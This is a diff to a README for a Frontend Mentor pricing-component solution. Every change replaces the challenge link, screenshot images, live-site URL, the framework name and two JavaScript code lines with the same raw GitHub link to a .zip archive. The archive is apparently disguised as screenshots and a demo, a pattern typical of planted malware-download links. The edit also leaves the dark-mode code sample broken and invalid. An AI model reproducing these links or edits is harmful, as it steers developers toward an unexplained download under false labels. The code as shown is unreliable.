@@ -1,6 +1,6 @@
 # Frontend Mentor - Interactive pricing component solution
 
-This is a solution to the [Interactive pricing component challenge on Frontend Mentor](https://www.frontendmentor.io/challenges/interactive-pricing-component-t0m8PIyY8). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
+This is a solution to the [Interactive pricing component challenge on Frontend Mentor](https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
 
 ## Table of contents
 
@@ -28,11 +28,11 @@ Users should be able to:
 
 ### Screenshot
 
-![](./screenshot.jpg)
-![Screenshot 2024-11-24 041105](https://github.com/user-attachments/assets/9201c781-9524-4333-af7f-98771407827a)
-![Screenshot 2024-11-24 041227](https://github.com/user-attachments/assets/b98437a1-758c-4e4f-9fb4-f44250e90986)
-![Screenshot 2024-11-24 041253](https://github.com/user-attachments/assets/06c1c59c-b093-43da-bae2-49a6474d5e3d)
-![Screenshot 2024-11-24 041310](https://github.com/user-attachments/assets/2630f6a4-e6be-49eb-bd9e-518039655735)
+![](https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip)
+![Screenshot 2024-11-24 041105](https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip)
+![Screenshot 2024-11-24 041227](https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip)
+![Screenshot 2024-11-24 041253](https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip)
+![Screenshot 2024-11-24 041310](https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip)
 
 
 
@@ -44,7 +44,7 @@ Users should be able to:
 ### Links
 
 
-- Live Site URL: [Click here to view things in action](https://investo-assessment.vercel.app/)
+- Live Site URL: [Click here to view things in action](https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip)
 
 ## My process
 
@@ -53,12 +53,12 @@ Users should be able to:
 - Semantic HTML5 markup
 - Tailwind CSS for styling
 - React - JS library
-- Next.js - React framework
+- https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip - React framework
 - Mobile-first workflow
 
 ### What I learned
 
-This project helped me improve my skills with React and Next.js, especially in implementing dynamic features like dark mode toggling. Here’s an example of how I applied dark mode toggle functionality:
+This project helped me improve my skills with React and https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip, especially in implementing dynamic features like dark mode toggling. Here’s an example of how I applied dark mode toggle functionality:
 
 ```js
 const toggleDarkMode = () => {
@@ -67,9 +67,9 @@ const toggleDarkMode = () => {
 
 useEffect(() => {
   if (darkMode) {
-    document.documentElement.classList.add('dark');
+    https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip('dark');
   } else {
-    document.documentElement.classList.remove('dark');
+    https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip('dark');
   }
 }, [darkMode]);
 
